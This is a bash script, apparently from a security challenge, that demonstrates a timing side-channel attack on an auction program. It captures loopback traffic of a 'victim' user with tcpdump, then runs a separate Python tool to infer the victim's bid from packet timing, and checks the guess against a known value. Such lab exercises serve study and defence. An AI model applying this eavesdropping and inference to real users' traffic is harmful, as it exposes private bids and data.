#!/bin/bash
set -e

# always rebuild.  timings vary from on NUC to another enough to affect this attack
REBUILD=1

if [ "$#" -eq 1 ]; then
    if [ "$1" == "rebuild" ]; then
        REBUILD=1
    fi
fi

# step 1, start tcpdump
echo "Start eavesdropping on user"
/usr/sbin/tcpdump -i lo -w usertraffic.pcap tcp port 9003 > /dev/null &
TCPDUMP_PID=$!
sleep 1

# step 2, have a normal user make a bid
echo "Users perform auction"

expect user.expect ../../../challenge_program/data/nyc/nyc.id profile_buyer.json > nyc.out &               # a bidder, port 9002
expect user.expect ../../../challenge_program/data/rochester/rochester.id profile_victim.json > victim.out # victim/seller on port 9003


# step 3, stop tcpdump
sleep 1
echo "Stop eavesdropping"
kill $TCPDUMP_PID #> /dev/null

# step 4, have the attacker build the bid time signature signature database
if [ $REBUILD -eq 1 ]; then
    echo "Start building a bid->time signature DB"
    python ./pb_bid_attack.py build lo referencetraffic.pcap bid_times_db.json > /dev/null
else
    echo "Skipping building of bid->time signature DB, if you want to rebuild it run this script as ./malicious_pbbidattack.sh rebuild"
fi

# step 5, have the attacker guess the user's bid
echo "Try to determine the approximate value of the victim's bid"
GUESS=$(python ./pb_bid_attack.py attack usertraffic.pcap 127.0.0.1 9003 bid_times_db.json | tail -1) 
if [ $((GUESS - 73)) -le 30 ]; then
    if  [ $((73 - GUESS)) -le 30 ]; then
    	echo "Successfully guessed within 30 of bid"
    else
    	echo "Failed to guess within 30 of bid"
    fi
else
    echo "Failed to guess within 30 of bid"
fi

